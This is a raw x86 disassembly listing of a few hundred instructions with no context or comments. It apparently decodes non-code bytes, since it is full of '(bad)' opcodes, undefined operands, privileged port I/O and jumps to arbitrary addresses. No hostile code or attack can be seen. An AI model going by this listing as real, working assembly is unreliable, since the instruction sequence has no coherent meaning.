  527da5:	nop
  527da6:	jle    0x527da1
  527da8:	leave  
  527da9:	jnp    0x527e0a
  527dab:	mov    edx,0xa7e02097
  527db0:	mov    dh,0x6e
  527db2:	jbe    0x527d99
  527db4:	test   BYTE PTR [edi],dh
  527db6:	xor    DWORD PTR [edi-0x2d],ebx
  527db9:	outs   dx,DWORD PTR ds:[esi]
  527dba:	dec    ebx
  527dbb:	mov    WORD PTR [edi+0x73],ds
  527dbe:	adc    eax,0x939755c6
  527dc3:	fcomp  DWORD PTR [edx-0xe]
  527dc6:	and    eax,0x48338954
  527dcb:	sbb    al,0xcf
  527dcd:	add    DWORD PTR [eax-0x2afcbe84],eax
  527dd3:	mov    esi,0x719986f4
  527dd8:	xchg   esi,eax
  527dd9:	sahf   
  527dda:	dec    edi
  527ddb:	cmp    DWORD PTR [edi+0x3b4b02de],esp
  527de1:	int3   
  527de2:	aad    0x29
  527de4:	arpl   WORD PTR [ebx-0x18],sp
  527de7:	loope  0x527e2a
  527de9:	mov    gs,WORD PTR [edi]
  527deb:	jmp    0x1ab5:0x40967c9c
  527df2:	push   ss
  527df3:	xor    esp,DWORD PTR [eax-0x2aa52cca]
  527df9:	or     dl,cl
  527dfb:	mov    al,0xec
  527dfd:	mov    ecx,0x8bb21c71
  527e02:	ds add ah,bl
  527e05:	cmp    bh,BYTE PTR [esi+0x17]
  527e08:	xor    DWORD PTR [esi],ebp
  527e0a:	es mov esp,0x97ceca80
  527e10:	xor    DWORD PTR [edi-0x3d],esi
  527e13:	mov    bl,0x98
  527e15:	dec    edx
  527e16:	inc    edi
  527e17:	enter  0xae1c,0xfb
  527e1b:	pop    edx
  527e1c:	shr    DWORD PTR [ebx-0x8],0x7a
  527e20:	cdq    
  527e21:	hlt    
  527e22:	iret   
  527e23:	lea    esi,[eax+0x5c]
  527e26:	adc    BYTE PTR [eax-0x31],dl
  527e29:	popf   
  527e2a:	add    DWORD PTR [ecx+ecx*4],esp
  527e2d:	mov    bl,0x61
  527e2f:	inc    edx
  527e30:	mov    esi,0x5752ec3d
  527e35:	in     al,0x60
  527e37:	or     ecx,DWORD PTR [ebx]
  527e39:	out    dx,al
  527e3a:	sti    
  527e3b:	push   edi
  527e3c:	(bad)  
  527e3d:	int3   
  527e3e:	xchg   edx,eax
  527e3f:	mov    bh,0x12
  527e41:	or     dh,ch
  527e43:	xor    dl,bh
  527e45:	lods   al,BYTE PTR ds:[esi]
  527e46:	aad    0xb3
  527e48:	xor    edx,esp
  527e4a:	and    ecx,DWORD PTR [ecx+edx*1]
  527e4d:	inc    ebx
  527e4e:	mov    ?,WORD PTR [ecx+0x37]
  527e51:	test   eax,0x79d0818f
  527e56:	pop    ss
  527e57:	rcl    BYTE PTR [ebx-0x39],0x5
  527e5b:	xor    edi,eax
  527e5d:	(bad)  
  527e5e:	push   ecx
  527e5f:	push   es
  527e60:	lahf   
  527e61:	call   0xe13e4c5
  527e66:	pop    ebx
  527e67:	sub    al,0xa4
  527e69:	xor    BYTE PTR [ebp-0x39],0xc6
  527e6d:	sbb    bh,ah
  527e6f:	sub    al,0x4c
  527e71:	or     esp,DWORD PTR ds:0x40d24fdc
  527e77:	outs   dx,BYTE PTR ds:[esi]
  527e78:	stos   DWORD PTR es:[edi],eax
  527e79:	or     ebx,edi
  527e7b:	dec    ebp
  527e7c:	addr16 inc eax
  527e7e:	dec    edi
  527e7f:	inc    ebx
  527e80:	scas   al,BYTE PTR es:[edi]
  527e81:	and    ch,BYTE PTR [ecx+eiz*4]
  527e84:	shr    DWORD PTR gs:[ebx],1
  527e87:	fwait
  527e88:	iret   
  527e89:	icebp  
  527e8a:	sub    eax,esp
  527e8c:	adc    BYTE PTR [edi],0x89
  527e8f:	mov    ah,0x9b
  527e91:	mov    ds:0x18763c1b,eax
  527e96:	jp     0x527e4a
  527e98:	or     DWORD PTR [eax+0x46],esi
  527e9b:	mov    esp,0x5d25252
  527ea0:	xor    BYTE PTR [ecx+0x63786544],0x9f
  527ea7:	xchg   ebx,eax
  527ea8:	in     al,0xeb
  527eaa:	in     al,0x38
  527eac:	sbb    eax,0x47134d5c
  527eb1:	pop    edx
  527eb2:	mov    al,ds:0x9bd150ef
  527eb7:	inc    ecx
  527eb8:	shr    BYTE PTR [ebx],0x8c
  527ebb:	jno    0x527e5c
  527ebd:	cli    
  527ebe:	mov    ds:0xe81e28da,eax
  527ec3:	sbb    ch,BYTE PTR [esi]
  527ec5:	add    BYTE PTR [eax+0x26],bl
  527ec8:	sahf   
  527ec9:	or     dh,BYTE PTR [ebp+0x65]
  527ecc:	cmp    eax,0x44bd112c
  527ed1:	xchg   esi,eax
  527ed2:	stos   DWORD PTR es:[edi],eax
  527ed3:	add    cl,dh
  527ed5:	out    dx,al
  527ed6:	or     DWORD PTR [edx+0x1fdf708b],edi
  527edc:	mov    eax,ds:0xf0a97cac
  527ee1:	jmp    0x527e73
  527ee3:	jbe    0x527e90
  527ee5:	cmp    al,0x13
  527ee7:	cdq    
  527ee8:	bound  ecx,QWORD PTR [eax]
  527eea:	lahf   
  527eeb:	lods   al,BYTE PTR ds:[esi]
  527eec:	jp     0x527f5c
  527eee:	test   eax,0x6ad9f312
  527ef3:	seto   BYTE PTR [eax+0x645214a6]
  527efa:	fwait
  527efb:	dec    esi
  527efc:	ins    BYTE PTR es:[edi],dx
  527efd:	dec    ecx
  527efe:	fidiv  WORD PTR [edi-0x79dd514]
  527f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527f05:	xor    dl,BYTE PTR ds:0x17030341
  527f0b:	mov    ds:0x97885801,al
  527f10:	jp     0x527f61
  527f12:	push   edx
  527f13:	fldcw  WORD PTR [edx]
  527f15:	jne    0x527eac
  527f17:	out    dx,al
  527f18:	mov    al,ds:0xed8e6987
  527f1d:	add    bl,dh
  527f1f:	jle    0x527efb
  527f21:	or     BYTE PTR [edi],0x2f
  527f24:	cmp    BYTE PTR [ebp+ebx*1+0x5af348ba],ch
  527f2b:	icebp  
  527f2c:	add    eax,0xa6fc18fa
  527f31:	cmp    al,0x1e
  527f33:	push   cs
  527f34:	xchg   edx,eax
  527f35:	repnz cmp BYTE PTR [ebx+0x518ed423],bh
  527f3c:	mov    edi,0x59f59de4
  527f41:	add    DWORD PTR [edi+0x44],esp
  527f44:	ins    DWORD PTR es:[edi],dx
  527f45:	cdq    
  527f46:	pop    ebp
  527f47:	ret    
  527f48:	cmp    BYTE PTR [esi+0x77ac7023],dl
  527f4e:	mov    bl,dh
  527f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  527f51:	dec    esp
  527f52:	and    eax,0x23099845
  527f57:	in     eax,dx
  527f58:	mov    esi,0x904633d
  527f5d:	pop    ecx
  527f5e:	sub    BYTE PTR [edi+0x5f],ah
  527f61:	aas    
  527f62:	(bad)  
  527f63:	shl    BYTE PTR [ecx-0x6059f62a],cl
  527f69:	pop    edx
  527f6a:	cmc    
  527f6b:	push   ss
  527f6c:	dec    edx
  527f6d:	jne    0x527f04
  527f6f:	fs je  0x527fb9
  527f72:	cmp    DWORD PTR [edx+0x134b77b1],eax
  527f78:	and    al,0x84
  527f7a:	retf   0xb2c9
  527f7d:	xor    ebp,esp
  527f7f:	sub    BYTE PTR [edi+0x5bb3ce5],dl
  527f85:	jecxz  0x527f5b
  527f87:	sub    DWORD PTR [ebx-0x3f],ecx
  527f8a:	test   BYTE PTR [edx+0x700d4d86],0xfb
  527f91:	ds xchg di,ax
  527f94:	sti    
  527f95:	in     al,0x39
  527f97:	js     0x527fcd
  527f99:	cmp    DWORD PTR [ecx-0x44],ebp
  527f9c:	sub    al,0xe3
  527f9e:	pop    eax
  527f9f:	inc    esp
  527fa0:	xor    BYTE PTR [edi],cl
  527fa2:	jb     0x527fb9
  527fa4:	cmp    BYTE PTR [edi+0x2b649b72],dh
  527faa:	js     0x527f67
  527fac:	inc    bl
  527fae:	lods   eax,DWORD PTR ds:[esi]
  527faf:	out    dx,eax
  527fb0:	lock push edi
  527fb2:	shr    DWORD PTR [edx],cl
  527fb4:	daa    
  527fb5:	pusha  
  527fb6:	or     al,0x62
  527fb8:	(bad)  
  527fb9:	in     al,dx
  527fba:	sbb    BYTE PTR ds:0xb10b7663,dh
  527fc0:	pusha  
  527fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  527fc2:	push   edi
  527fc3:	loope  0x52800f
  527fc5:	add    BYTE PTR [eax+0x42],dh
  527fc8:	ja     0x52800d
  527fca:	cmp    esp,DWORD PTR [ecx+eiz*1+0x323a7b84]
  527fd1:	out    dx,eax
  527fd2:	add    ecx,esp
  527fd4:	and    ch,BYTE PTR [edi]
  527fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  527fd7:	(bad)
  527fda:	pop    eax
  527fdb:	pusha  
  527fdc:	data16 cmc 
  527fde:	mov    ds:0xc2f4c5cc,al
  527fe3:	or     al,0x61
  527fe5:	inc    esp
  527fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  527fe7:	fcmove st,st(7)
  527fe9:	ds stos DWORD PTR es:[edi],eax
  527feb:	fmul   st,st(3)
  527fed:	add    eax,0xae57889d
  527ff2:	xor    edx,esp
  527ff4:	sub    DWORD PTR [esi-0x73],ecx
  527ff7:	cli    
  527ff8:	mov    dx,0x4ece
  527ffc:	mov    edi,0x8817958e
  528001:	jo     0x527fde
  528003:	inc    ebx
  528004:	push   es
  528005:	call   0x374d:0xdbeda3f8
  52800c:	inc    esi
  52800d:	add    eax,0x6eb8b78c
  528012:	aaa    
  528013:	std    
  528014:	sti    
  528015:	adc    dl,BYTE PTR [ebp-0x65da825d]
  52801b:	xchg   ebp,eax
  52801c:	or     BYTE PTR [edx-0x76b1b0a0],cl
  528022:	sub    eax,0xb2f096d7
  528027:	or     DWORD PTR [edi],edx
  528029:	in     al,0xd4
  52802b:	ds xor ebp,ebx
  52802e:	pop    ebp
  52802f:	xchg   DWORD PTR [ebx+0x60caa52],esi
  528035:	jmp    0x97b0614e
  52803a:	neg    BYTE PTR [eax-0x6c]
  52803d:	les    esi,FWORD PTR [edi+0x69bdbfde]
  528043:	and    dh,al
  528045:	fidiv  WORD PTR [eax-0x2a]
  528048:	js     0x528097
  52804a:	out    0xaa,al
  52804c:	test   DWORD PTR [esi+0x33e15f7],esi
  528052:	mov    al,0xfa
  528054:	ds ret 
  528056:	dec    esp
  528057:	sbb    dh,bl
  528059:	xchg   esi,eax
  52805a:	cld    
  52805b:	stc    
  52805c:	or     eax,0xcf3e465
  528061:	xor    edx,ecx
  528063:	sbb    BYTE PTR [esi-0x15],bh
  528066:	push   esi
  528067:	in     eax,0xdc
  528069:	aad    0x25
  52806b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52806c:	fild   DWORD PTR [esi]
  52806e:	jp     0x528097
  528070:	inc    esi
  528071:	cld    
  528072:	add    al,0x2e
  528074:	in     al,0xcc
  528076:	mov    BYTE PTR [ebp-0x4d45c9af],al
  52807c:	retf   
  52807d:	mov    edx,0x6da80d95
  528082:	pop    esi
  528083:	hlt    
  528084:	push   edi
  528085:	sbb    ecx,DWORD PTR ds:0x3b81cf27
  52808b:	scas   al,BYTE PTR es:[edi]
  52808c:	or     ebp,DWORD PTR [ebp+0x66863d79]
  528092:	aam    0xb3
  528094:	jge    0x5280ea
  528096:	adc    al,0x98
  528098:	jl     0x52802e
  52809a:	ret    
  52809b:	scas   eax,DWORD PTR es:[edi]
  52809c:	fdivr  QWORD PTR [edx-0x80]
  52809f:	mov    eax,ds:0xdd02d59e
  5280a4:	out    dx,al
  5280a5:	lahf   
  5280a6:	sbb    dl,BYTE PTR [ebx-0x47185a8f]
  5280ac:	int3   
  5280ad:	dec    esi
  5280ae:	(bad)  
  5280af:	lods   eax,DWORD PTR ds:[esi]
  5280b0:	jae    0x528033
  5280b2:	into   
  5280b3:	in     eax,dx
  5280b4:	jnp    0x5280f1
  5280b6:	pop    eax
  5280b7:	stos   DWORD PTR es:[edi],eax
  5280b8:	xor    eax,0xa87f2033
  5280bd:	cmp    DWORD PTR [ebx+0x7c],0x7496399e
  5280c4:	popa   
  5280c5:	into   
  5280c6:	cmp    BYTE PTR ds:0xf6d97e42,0x74
  5280cd:	cmp    dl,dl
  5280cf:	inc    esp
  5280d0:	push   esp
  5280d1:	ja     0x52805e
  5280d3:	icebp  
  5280d4:	jno    0x5280dd
  5280d6:	mov    BYTE PTR [edi-0x520109d4],cl
  5280dc:	ret    0x4ced
  5280df:	(bad)  
  5280e0:	hlt    
  5280e1:	loop   0x5280de
  5280e3:	xchg   ecx,eax
  5280e4:	mov    DWORD PTR ds:[eax+0x56069558],ebp
  5280eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5280ec:	imul   edx,DWORD PTR [edx+0x696694bc],0x32
  5280f3:	xor    al,0xd2
  5280f5:	sbb    al,0xa5
  5280f7:	retf   0x51bf
  5280fa:	jecxz  0x5280ad
  5280fc:	mov    dh,0x3
  5280fe:	jns    0x52814c
  528100:	jg     0x528122
  528102:	retf   
  528103:	outs   dx,BYTE PTR ds:[esi]
  528104:	sub    eax,esp
  528106:	sub    edx,DWORD PTR [edx]
  528108:	pop    ecx
  528109:	(bad)  
  52810a:	jno    0x52811c
  52810c:	mov    bl,0xa2
  52810e:	aas    
  52810f:	iret   
  528110:	jge    0x5280f3
  528112:	test   DWORD PTR [esi+0x6bdadec1],edx
  528118:	jno    0x528107
  52811a:	pop    edi
  52811b:	jmp    0xfad0:0xdd37c771
  528122:	mov    esp,0x391f8ce7
  528127:	mov    DWORD PTR [ebx+0x52],ecx
  52812a:	sti    
  52812b:	leave  
  52812c:	inc    edx
  52812d:	daa    
  52812e:	scas   eax,DWORD PTR es:[edi]
  52812f:	adc    DWORD PTR [eax-0x5fc32e83],edi
  528135:	fisub  WORD PTR [edi+0x4a]
  528138:	jmp    ebp
  52813a:	mov    ds:0x21e37ab9,eax
  52813f:	ret    0x3461
  528142:	cmc    
  528143:	dec    ecx
  528144:	push   esi
  528145:	push   edi
  528146:	popa   
  528147:	push   esp
  528148:	add    ebp,DWORD PTR [edx+0x5d346f2]
  52814e:	add    ebx,eax
  528150:	inc    ebx
  528151:	sbb    DWORD PTR [edx+ebp*4],ecx
  528154:	inc    ebp
  528155:	dec    esi
  528156:	rcr    BYTE PTR [esi-0x4b],1
  528159:	and    cl,cl
  52815b:	xor    al,0x68
  52815d:	ds into 
  52815f:	inc    ebx
  528160:	sahf   
  528161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  528162:	push   esi
  528163:	loopne 0x528146
  528165:	mov    ecx,0xb01bcd26
  52816a:	scas   eax,DWORD PTR es:[edi]
  52816b:	call   0x27b:0x641a7b87
  528172:	clc    
  528173:	jae    0x52815e
  528175:	sub    al,0x74
  528177:	sti    
  528178:	dec    esi
  528179:	cli    
  52817a:	jno    0x5281e3
  52817c:	shl    DWORD PTR [esi],0xc4
  52817f:	jb     0x528131
  528181:	sbb    DWORD PTR [ecx],0xffffff87
  528184:	js     0x5281b5
  528186:	or     eax,0xfeabbd31
  52818b:	xor    dh,ch
  52818d:	jg     0x528199
  52818f:	in     al,dx
  528190:	call   0x1005:0x16439074
  528197:	mov    ds:0x715f62e1,eax
  52819c:	aas    
  52819d:	push   edx
  52819e:	add    al,0xf5
  5281a0:	mov    ds,WORD PTR [edx+0x21]
  5281a3:	push   ds
  5281a4:	add    ch,al
  5281a6:	pop    edi
  5281a7:	xor    dh,BYTE PTR [edi+0x4da22029]
  5281ad:	inc    esp
  5281ae:	mov    eax,0xe4ed62a0
  5281b3:	mov    ch,0x77
  5281b5:	test   DWORD PTR [edi],esi
  5281b7:	jge    0x52817d
  5281b9:	fdivr  QWORD PTR [esi]
  5281bb:	cmp    ecx,DWORD PTR [esi]
  5281bd:	and    BYTE PTR [eax+0x76],bh
  5281c0:	mov    esp,0xb683bcfb
  5281c5:	loop   0x528153
  5281c7:	pop    edi
  5281c8:	pushf  
  5281c9:	ins    BYTE PTR es:[edi],dx
  5281ca:	push   es
  5281cb:	mov    ebp,0xc93f1fb2
  5281d0:	push   ds
  5281d1:	(bad)  
  5281d3:	sub    bh,BYTE PTR [edi]
  5281d5:	mov    DWORD PTR [ecx-0x34e65ca1],ebx
  5281db:	ja     0x528204
  5281dd:	inc    esp
  5281de:	fwait
  5281df:	push   ecx
  5281e0:	pop    ss
  5281e1:	jle    0x52816d
  5281e3:	les    ebp,FWORD PTR [esi+0x37]
  5281e6:	cmovne ecx,DWORD PTR [edi+edi*4-0x73]
  5281eb:	or     esi,DWORD PTR ds:0xc8c4322e
  5281f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5281f2:	mov    gs,WORD PTR [ebp-0x57]
  5281f5:	sar    BYTE PTR [ebx+0x3],0x64
  5281f9:	or     DWORD PTR [ebx],ebx
  5281fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5281fc:	pop    esp
  5281fd:	cmp    al,0x83
  5281ff:	push   esp
  528200:	mov    bl,0x18
  528202:	sub    bl,BYTE PTR [edx+0x76]
  528205:	push   es
  528206:	sub    eax,0x4218f3ae
  52820b:	mov    BYTE PTR [edi],dl
  52820d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52820e:	pop    esi
  52820f:	repz cld 
  528211:	add    edi,DWORD PTR [eax-0x11]
  528214:	xchg   ebx,eax
  528215:	pop    ebp
  528216:	xchg   ecx,eax
  528217:	mov    DWORD PTR [edi+esi*2-0x2ed5db12],edx
  52821e:	test   esp,0xed3c925f
  528224:	adc    esp,DWORD PTR [ecx-0x69fdf643]
  52822a:	adc    DWORD PTR [eax-0x659272f3],edx
  528230:	xchg   ebx,eax
  528231:	popa   
  528232:	aaa    
  528233:	pop    esi
  528234:	jns    0x528201
  528236:	add    ebp,ebp
  528238:	icebp  
  528239:	sti    
  52823a:	inc    ebx
  52823b:	aad    0x6e
  52823d:	and    al,0xa4
  52823f:	gs xchg ebx,eax
  528241:	mov    ebp,0xe01fb166
  528246:	test   al,0xcf
  528248:	hlt    
  528249:	dec    esi
  52824a:	adc    dl,BYTE PTR [eax]
  52824c:	jno    0x528200
  52824e:	push   eax
  52824f:	xor    edx,DWORD PTR [edi-0x9]
  528252:	mov    fs,WORD PTR [edi-0x31]
  528255:	push   cs
  528256:	in     eax,0x54
  528258:	fidivr WORD PTR [ebx]
  52825a:	mov    dh,ah
  52825c:	push   ds
  52825d:	xchg   edi,eax
  52825e:	adc    al,BYTE PTR [edi+0x3b2791ee]
  528264:	pop    ds
  528265:	retf   
  528266:	dec    ebx
  528267:	jg     0x5282ad
  528269:	sbb    edi,DWORD PTR [esi+0x14]
  52826c:	pop    ds
  52826d:	mov    dh,0xa6
  52826f:	dec    edx
  528270:	dec    esi
  528271:	rcl    edi,0x43
  528274:	or     al,0xc8
  528276:	stos   DWORD PTR es:[edi],eax
  528277:	clc    
  528278:	or     ch,BYTE PTR [edi+0x2eba6b72]
  52827e:	pop    ebp
  52827f:	aad    0xd0
  528281:	retf   0xa82c
  528284:	fwait
  528285:	imul   ebp,DWORD PTR [ecx],0xffffffa2
  528288:	mov    eax,0x6494eee
  52828d:	jle    0x528298
  52828f:	push   ss
  528290:	fs unpckhps xmm3,xmm0
  528294:	push   edi
  528295:	jp     0x528300
  528297:	jmp    0xd8ac:0x3e4b9b0b
  52829e:	leave  
  52829f:	enter  0xfdc6,0xd4
  5282a3:	sbb    dh,ch
  5282a5:	fbld   TBYTE PTR [ebx+0x8]
  5282a8:	lds    esi,FWORD PTR [ebx]
  5282aa:	sbb    ch,al
  5282ac:	ins    DWORD PTR es:[edi],dx
  5282ad:	ret    
  5282ae:	dec    eax
  5282af:	outs   dx,DWORD PTR ds:[esi]
  5282b0:	and    eax,0xd78f9234
  5282b5:	shl    DWORD PTR [edi+edx*8],cl
  5282b8:	push   eax
  5282b9:	repz fidiv WORD PTR [esi+ecx*8]
  5282bd:	repnz dec ecx
  5282bf:	add    esp,edi
  5282c1:	or     al,ah
  5282c3:	mov    DWORD PTR [esp+eax*4],esi
  5282c6:	add    esi,eax
  5282c8:	les    ebx,FWORD PTR [ebx-0x20]
  5282cb:	adc    al,0x3b
  5282cd:	mov    eax,ds:0x75640c5d
  5282d2:	les    ebp,FWORD PTR [edi-0x7d3d4d15]
  5282d8:	add    DWORD PTR ds:0xf2dfcd6a,esp
  5282de:	pop    es
  5282df:	es es pusha 
  5282e2:	mov    cl,0x99
  5282e4:	pop    edx
  5282e5:	push   ss
  5282e6:	call   DWORD PTR [ebp+0x429cacd6]
  5282ec:	dec    edi
  5282ed:	pushf  
  5282ee:	sbb    ch,BYTE PTR [edi+0x6d]
  5282f1:	gs dec edi
  5282f3:	inc    edi
  5282f4:	mov    dl,0xd0
  5282f6:	(bad)  [ebp+0x39]
  5282f9:	jmp    0xa09d2d38
  5282fe:	or     dl,dl
  528300:	sbb    al,BYTE PTR [eax+0x12]
  528303:	xor    BYTE PTR [esi],cl
  528305:	mov    edx,0x479445a
  52830a:	or     ch,BYTE PTR [edi]
  52830c:	dec    ebx
  52830d:	mov    esp,0x494892a
  528312:	repz popf 
  528314:	fstp   TBYTE PTR [esi+edi*2+0x2a]
  528318:	sbb    al,0x61
  52831a:	vandpd ymm7,ymm7,ymm2
  52831e:	or     DWORD PTR [ecx],ebx
  528320:	fisub  WORD PTR [esi+edx*4]
  528323:	sbb    al,0x43
  528325:	in     eax,0x4a
  528327:	mov    ebx,0x86dd90ec
  52832c:	int3   
  52832d:	aam    0xb8
  52832f:	ficom  DWORD PTR [edi+0x1c]
  528332:	pop    ebp
  528333:	push   esi
  528334:	sub    dh,dh
  528336:	dec    esi
  528337:	sub    DWORD PTR [edi-0x1c8fa228],ebp
  52833d:	sub    BYTE PTR [ecx-0x7c],bh
  528340:	test   DWORD PTR [edi],0xcad851d1
  528346:	jecxz  0x5283c4
  528348:	sub    DWORD PTR [eax+0x43944fab],ebp
  52834e:	push   esi
  52834f:	mov    edx,0x7dfd9f99
  528354:	ins    DWORD PTR es:[edi],dx
  528355:	xchg   esi,eax
  528356:	outs   dx,DWORD PTR ds:[esi]
  528357:	sub    dh,BYTE PTR [ebx-0x40b61ee4]
  52835d:	or     BYTE PTR [esi-0x4215fed4],dh
  528363:	popf   
  528364:	add    al,0xb2
  528366:	pop    edx
  528367:	and    eax,0xae136775
  52836c:	loope  0x528352
  52836e:	outs   dx,DWORD PTR ds:[esi]
  52836f:	mov    bh,0x24
  528371:	sub    edi,DWORD PTR [eax]
  528373:	rcr    BYTE PTR [ebp+eax*2+0x784d7ac7],0x19
  52837b:	jae    0x528329
  52837d:	test   edi,0xa1afc224
  528383:	mov    edx,DWORD PTR [ecx-0x78738445]
  528389:	icebp  
  52838a:	repnz lds edi,FWORD PTR [ecx+0x3f]
  52838e:	retf   0xa8db
  528391:	push   esp
  528392:	into   
  528393:	mov    ebp,0xfda04bf0
  528398:	xchg   esi,eax
  528399:	and    esp,eax
  52839b:	ret    
  52839c:	inc    eax
  52839d:	adc    eax,0x933dc62d
  5283a2:	inc    esp
  5283a3:	add    eax,0xde09f83a
  5283a8:	mov    esp,0x2663f6a9
  5283ad:	mov    ds:0xe684e6bd,eax
  5283b2:	mov    ?,WORD PTR [edi]
  5283b4:	push   esp
  5283b5:	jb     0x528342
  5283b7:	xor    BYTE PTR [ecx+0x205ef643],bl
  5283bd:	aas    
  5283be:	push   esi
  5283bf:	inc    esp
  5283c0:	aaa    
  5283c1:	sbb    DWORD PTR [ebx-0x6e],eax
  5283c4:	pop    esp
  5283c5:	sub    DWORD PTR [edx-0x6d61995d],esi
  5283cb:	inc    eax
  5283cc:	mov    dh,0x9b
  5283ce:	cld    
  5283cf:	popa   
  5283d0:	xchg   ecx,eax
  5283d1:	pop    edi
  5283d2:	jne    0x528443
  5283d4:	and    eax,0xfd10c84e
  5283d9:	sub    DWORD PTR [eax],esp
  5283db:	adc    BYTE PTR [esi],bh
  5283dd:	push   es
  5283de:	scas   al,BYTE PTR es:[edi]
  5283df:	lock fidivr WORD PTR [edx+ecx*1]
  5283e3:	cmp    bl,bl
  5283e5:	stc    
  5283e6:	jge    0x52842e
  5283e8:	neg    DWORD PTR [eax+0x49]
  5283eb:	in     al,0x2f
  5283ed:	mov    WORD PTR [esi],?
  5283ef:	push   edi
  5283f0:	ja     0x528417
  5283f2:	retf   
  5283f3:	cmc    
  5283f4:	jne    0x528460
  5283f6:	int3   
  5283f7:	mov    ch,0x38
  5283f9:	xchg   ecx,eax
  5283fa:	clc    
  5283fb:	in     al,dx
  5283fc:	or     DWORD PTR [eax+0x4b7112b2],esi
  528402:	or     eax,0xfa823411
  528407:	ret    0x95f9
  52840a:	mov    dh,BYTE PTR [ebp+0x3517754]
  528410:	lahf   
  528411:	jmp    0x7db5:0x67d4a66b
  528418:	das    
  528419:	or     DWORD PTR [eax+0x24],edi
  52841c:	nop
  52841d:	int    0xfc
  52841f:	push   esi
  528420:	cmp    al,BYTE PTR [edx+0x4b]
  528423:	out    0x46,al
  528425:	adc    cl,BYTE PTR [eax+0x46dcf5f1]
  52842b:	in     eax,dx
  52842c:	ins    DWORD PTR es:[edi],dx
  52842d:	sub    bh,BYTE PTR [ebx+0x10952149]
  528433:	(bad)  
  528434:	mov    esp,0x5e632963
  528439:	loope  0x528480
  52843b:	fnsave [ecx]
  52843d:	in     al,dx
  52843e:	mov    cl,0xcf
  528440:	cld    
  528441:	stc    
  528442:	(bad)  
  528443:	aam    0xfd
  528445:	fdiv   QWORD PTR [ecx+eiz*4+0x3a451aa5]
  52844c:	loopne 0x5283ee
  52844e:	jg     0x528467
  528450:	mov    bl,0x4c
  528452:	cmp    al,BYTE PTR [eax-0x15e964bf]
  528458:	fsub   st,st(0)
  52845a:	fbld   TBYTE PTR [edi]
  52845c:	or     ebx,DWORD PTR [esi+0x4f276c92]
  528462:	ja     0x52846a
  528464:	and    eax,0x90ed7533
  528469:	shl    DWORD PTR [esi+0x39],0x67
  52846d:	mov    bh,0xf0
  52846f:	lock les eax,FWORD PTR [ebp+0x6b23bdad]
  528476:	sti    
  528477:	jp     0x52847a
  528479:	xor    ebp,DWORD PTR [ecx-0x77]
  52847c:	je     0x5284e5
  52847e:	lods   eax,DWORD PTR ds:[esi]
  52847f:	xchg   BYTE PTR [ebx-0xe],bl
  528482:	ret    0xc4eb
  528485:	or     BYTE PTR [esi],dl
  528487:	sub    DWORD PTR [edx-0x6c9d7c80],ebp
  52848d:	scas   eax,DWORD PTR es:[edi]
  52848e:	pusha  
  52848f:	repz mov fs,WORD PTR [eax]
  528492:	dec    esi
  528493:	scas   eax,DWORD PTR es:[edi]
  528494:	jns    0x528452
  528496:	inc    ecx
  528497:	and    al,0xf1
  528499:	call   0xb06fc3aa
  52849e:	addr16 xchg esi,eax
  5284a0:	sub    ebp,DWORD PTR [ecx-0x3d]
  5284a3:	xchg   ebp,eax
  5284a4:	jae    0x528462
  5284a6:	out    dx,al
  5284a7:	rcl    DWORD PTR [edx+0x1c],0x18
  5284ab:	pop    ecx
  5284ac:	repnz lea ecx,[edi]
  5284af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5284b0:	imul   edi,esp,0x469b05d6
  5284b6:	or     cl,ah
  5284b8:	iret   
  5284b9:	ins    DWORD PTR es:[edi],dx
  5284ba:	mov    cl,0x29
  5284bc:	bnd jb 0x5284e9
  5284bf:	and    bl,BYTE PTR [edi]
  5284c1:	in     eax,dx
  5284c2:	imul   ebx,DWORD PTR [edi+edx*2-0x1f7dc1dc],0x31
  5284ca:	(bad)  
  5284cb:	mov    ch,0x32
  5284cd:	push   es
  5284ce:	ds xchg esi,eax
  5284d0:	jecxz  0x528511
  5284d2:	ja     0x528513
  5284d4:	sbb    DWORD PTR [ebp+0x298d5d48],edx
  5284da:	in     eax,dx
  5284db:	scas   al,BYTE PTR es:[edi]
  5284dc:	in     eax,0xb6
  5284de:	stos   BYTE PTR es:[edi],al
  5284df:	in     al,dx
  5284e0:	les    ebp,FWORD PTR [eax+0x1f530d3f]
  5284e6:	test   eax,0xa87a02d3
  5284eb:	es and al,0x49
  5284ee:	out    dx,al
  5284ef:	sbb    DWORD PTR [eax+0xd512dcd],ebx
  5284f5:	scas   eax,DWORD PTR es:[edi]
  5284f6:	mov    ds:0x2b9ac759,al
  5284fb:	xor    ch,BYTE PTR [ebx+0x63]
  5284fe:	and    esp,DWORD PTR ds:0x35f5410c
  528504:	in     al,dx
  528505:	push   0x1a
  528507:	add    DWORD PTR [edi],edx
  528509:	in     eax,dx
  52850a:	ret    
  52850b:	mov    ds,WORD PTR [ecx-0x69]
  52850e:	xchg   ebp,eax
  52850f:	mov    BYTE PTR [eax-0x140cc463],ch
  528515:	stos   DWORD PTR es:[edi],eax
  528516:	push   es
  528517:	cmp    esi,ebp
  528519:	fbld   TBYTE PTR [edi-0x2a21f336]
  52851f:	and    eax,ebp
  528521:	xchg   al,dh
  528523:	and    dl,dl
  528525:	stos   DWORD PTR es:[edi],eax
  528526:	pop    es
  528527:	or     ah,0xd5
  52852a:	call   0xd925:0x3d5c5be5
  528531:	(bad)  
  528532:	std    
  528533:	lahf   
  528534:	nop
  528535:	cs lahf 
  528537:	push   esp
  528538:	int    0x1c
  52853a:	mov    dh,0xf5
  52853c:	rcr    ebx,1
  52853e:	push   ebx
  52853f:	mov    WORD PTR [esi-0x39a85ba8],ds
  528545:	int3   
  528546:	push   cs
  528547:	sbb    BYTE PTR [edx-0x5],ah
  52854a:	bound  esp,QWORD PTR [ebx-0x3e]
  52854d:	mov    dh,0xfd
  52854f:	mov    dh,0xad
  528551:	daa    
  528552:	mov    ch,0x5
